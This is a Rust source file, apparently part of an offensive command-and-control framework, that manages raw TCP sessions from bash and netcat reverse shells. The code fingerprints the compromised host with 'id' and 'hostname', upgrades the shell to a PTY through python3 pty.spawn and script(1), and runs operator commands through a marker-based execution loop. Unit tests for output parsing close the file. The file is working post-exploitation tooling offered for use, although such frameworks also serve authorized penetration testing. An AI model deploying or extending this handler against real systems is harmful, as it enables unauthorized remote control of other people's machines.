//! Raw TCP session handler for non-PKRL connections (bash, netcat reverse shells).
//!
//! Raw sessions use marker-based command execution: a unique marker string is appended
//! after each command, and output is collected until the marker appears. This is
//! inherently less reliable than the structured PKRL protocol but works with any
//! interactive shell.

use std::time::Duration;

use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::sync::mpsc;
use tracing::debug;

use crate::session::SessionCommand;

const DEFAULT_EXEC_TIMEOUT: u64 = 30;

/// Information parsed from probing a raw shell connection.
#[derive(Debug)]
pub struct RawShellInfo {
    pub uid: u32,
    pub username: String,
    pub hostname: String,
}

impl Default for RawShellInfo {
    fn default() -> Self {
        Self {
            uid: 0,
            username: "unknown".into(),
            hostname: "raw-shell".into(),
        }
    }
}

/// Probe the raw shell to detect user/host info and attempt PTY upgrade.
///
/// Sends `id` and `hostname` commands, parses the output, then tries
/// python3 pty.spawn and script(1) for PTY upgrade.
pub async fn probe_and_upgrade(stream: &mut TcpStream) -> RawShellInfo {
    let mut info = RawShellInfo::default();

    // Read any initial banner (prompt, MOTD, etc.)
    let banner = read_available(stream, 500).await;
    if !banner.is_empty() {
        let text = String::from_utf8_lossy(&banner);
        debug!("raw shell banner: {text:?}");
    }

    // Send `id` and parse output
    if let Some(output) = send_and_read(stream, "id\n", 2000).await {
        let clean = strip_ansi(&output);
        let text = String::from_utf8_lossy(&clean);
        debug!("raw shell id output: {text:?}");
        if let Some((uid, username)) = parse_id_output(&text) {
            info.uid = uid;
            info.username = username;
        }
    }

    // Send `hostname` and parse output
    if let Some(output) = send_and_read(stream, "hostname\n", 1000).await {
        let clean = strip_ansi(&output);
        let text = String::from_utf8_lossy(&clean);
        for line in text.lines() {
            let trimmed = line.trim();
            if !trimmed.is_empty()
                && !trimmed.contains("hostname")
                && !trimmed.ends_with('$')
                && !trimmed.ends_with('#')
            {
                info.hostname = trimmed.to_string();
                break;
            }
        }
    }

    // Attempt PTY upgrade: python3 first
    let _ = send_and_read(
        stream,
        "python3 -c \"import pty;pty.spawn('/bin/bash')\" 2>/dev/null\n",
        1000,
    )
    .await;

    // Fallback: script(1)
    let _ = send_and_read(stream, "script -qc /bin/bash /dev/null 2>/dev/null\n", 500).await;

    info
}

/// Run the raw session command loop, processing commands from the channel.
pub async fn raw_session_loop(mut stream: TcpStream, mut cmd_rx: mpsc::Receiver<SessionCommand>) {
    loop {
        tokio::select! {
            cmd = cmd_rx.recv() => {
                match cmd {
                    Some(SessionCommand::Exec { command, timeout_secs, reply }) => {
                        let t = if timeout_secs == 0 { DEFAULT_EXEC_TIMEOUT } else { timeout_secs };
                        let result = raw_exec(&mut stream, &command, t).await;
                        let _ = reply.send(result);
                    }
                    Some(SessionCommand::FileUp { reply, .. }) => {
                        let _ = reply.send(Err(
                            "file upload not supported for raw sessions".into(),
                        ));
                    }
                    Some(SessionCommand::FileDown { reply, .. }) => {
                        let _ = reply.send(Err(
                            "file download not supported for raw sessions".into(),
                        ));
                    }
                    Some(SessionCommand::SendFrame(_)) => {
                        // PKRL frames are meaningless for raw sessions
                    }
                    None => break,
                }
            }
        }
    }
    debug!("raw session loop exited");
}

/// Execute a command on a raw shell using marker-based output collection.
///
/// Sends `{command}; echo {marker}` and reads until the marker appears.
/// Strips the command echo (first line) and the marker from the output.
async fn raw_exec(
    stream: &mut TcpStream,
    command: &str,
    timeout_secs: u64,
) -> Result<Vec<u8>, String> {
    let marker = format!("__GLEIPNIR_{}__", uuid::Uuid::new_v4().simple());

    // Drain any pending output
    let _ = read_available(stream, 100).await;

    // Send command with marker sentinel
    let full_cmd = format!("{command}; echo {marker}\n");
    stream
        .write_all(full_cmd.as_bytes())
        .await
        .map_err(|e| format!("write failed: {e}"))?;

    // Read until marker appears
    let raw = read_until_marker(stream, &marker, timeout_secs).await?;
    let clean = strip_ansi(&raw);
    let text = String::from_utf8_lossy(&clean);

    // Extract output: everything between the command echo and the marker
    let output = if let Some(marker_pos) = text.find(&marker) {
        let before = &text[..marker_pos];
        let lines: Vec<&str> = before.lines().collect();
        if lines.len() > 1 {
            // Skip first line (command echo)
            lines[1..].join("\n")
        } else {
            before.to_string()
        }
    } else {
        text.to_string()
    };

    Ok(output.trim_end().as_bytes().to_vec())
}

// ── Helpers ──

/// Read whatever is available on the stream, waiting up to `timeout_ms`.
/// Returns empty vec on timeout (not an error).
async fn read_available(stream: &mut TcpStream, timeout_ms: u64) -> Vec<u8> {
    let mut buf = vec![0u8; 4096];
    match tokio::time::timeout(Duration::from_millis(timeout_ms), stream.read(&mut buf)).await {
        Ok(Ok(n)) if n > 0 => {
            buf.truncate(n);
            buf
        }
        _ => Vec::new(),
    }
}

/// Send a command and read the response with a timeout.
async fn send_and_read(stream: &mut TcpStream, cmd: &str, timeout_ms: u64) -> Option<Vec<u8>> {
    if stream.write_all(cmd.as_bytes()).await.is_err() {
        return None;
    }
    let data = read_available(stream, timeout_ms).await;
    if data.is_empty() { None } else { Some(data) }
}

/// Read from the stream until `marker` appears in the accumulated output.
async fn read_until_marker(
    stream: &mut TcpStream,
    marker: &str,
    timeout_secs: u64,
) -> Result<Vec<u8>, String> {
    let mut accumulated = Vec::new();
    let deadline = tokio::time::Instant::now() + Duration::from_secs(timeout_secs);
    let mut buf = vec![0u8; 4096];

    loop {
        let remaining = deadline.saturating_duration_since(tokio::time::Instant::now());
        if remaining.is_zero() {
            return Err("command timed out".into());
        }

        match tokio::time::timeout(remaining, stream.read(&mut buf)).await {
            Ok(Ok(0)) => return Err("connection closed".into()),
            Ok(Ok(n)) => {
                accumulated.extend_from_slice(&buf[..n]);
                let text = String::from_utf8_lossy(&accumulated);
                if text.contains(marker) {
                    return Ok(accumulated);
                }
            }
            Ok(Err(e)) => return Err(format!("read error: {e}")),
            Err(_) => return Err("command timed out".into()),
        }
    }
}

/// Strip ANSI escape sequences (CSI sequences) from byte data.
fn strip_ansi(input: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(input.len());
    let mut i = 0;
    while i < input.len() {
        if input[i] == 0x1b && i + 1 < input.len() && input[i + 1] == b'[' {
            // CSI sequence: ESC [ ... <final byte 0x40-0x7E>
            i += 2;
            while i < input.len() && !(0x40..=0x7E).contains(&input[i]) {
                i += 1;
            }
            if i < input.len() {
                i += 1; // skip final byte
            }
        } else if input[i] == 0x1b {
            // Other escape: skip ESC + next byte
            i += 2;
        } else {
            out.push(input[i]);
            i += 1;
        }
    }
    out
}

/// Parse `id` output: "uid=1000(user) gid=..." -> (uid, username)
fn parse_id_output(text: &str) -> Option<(u32, String)> {
    let uid_start = text.find("uid=")?;
    let rest = &text[uid_start + 4..];
    let paren = rest.find('(')?;
    let uid: u32 = rest[..paren].parse().ok()?;
    let close = rest.find(')')?;
    let username = rest[paren + 1..close].to_string();
    Some((uid, username))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_id_output() {
        let input = "uid=1000(testuser) gid=1000(testuser) groups=1000(testuser)";
        let (uid, user) = parse_id_output(input).unwrap();
        assert_eq!(uid, 1000);
        assert_eq!(user, "testuser");
    }

    #[test]
    fn test_parse_id_root() {
        let input = "uid=0(root) gid=0(root) groups=0(root)";
        let (uid, user) = parse_id_output(input).unwrap();
        assert_eq!(uid, 0);
        assert_eq!(user, "root");
    }

    #[test]
    fn test_parse_id_with_noise() {
        let input = "some prompt$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n$";
        let (uid, user) = parse_id_output(input).unwrap();
        assert_eq!(uid, 33);
        assert_eq!(user, "www-data");
    }

    #[test]
    fn test_parse_id_invalid() {
        assert!(parse_id_output("not an id output").is_none());
        assert!(parse_id_output("").is_none());
    }

    #[test]
    fn test_strip_ansi_basic() {
        let input = b"\x1b[32mhello\x1b[0m world";
        let stripped = strip_ansi(input);
        assert_eq!(stripped, b"hello world");
    }

    #[test]
    fn test_strip_ansi_cursor_movement() {
        let input = b"\x1b[1;34muser@host\x1b[0m:\x1b[1;34m~\x1b[0m$ ";
        let stripped = strip_ansi(input);
        assert_eq!(stripped, b"user@host:~$ ");
    }

    #[test]
    fn test_strip_ansi_no_escapes() {
        let input = b"plain text";
        let stripped = strip_ansi(input);
        assert_eq!(stripped, b"plain text");
    }

    #[test]
    fn test_strip_ansi_empty() {
        let stripped = strip_ansi(b"");
        assert!(stripped.is_empty());
    }
}
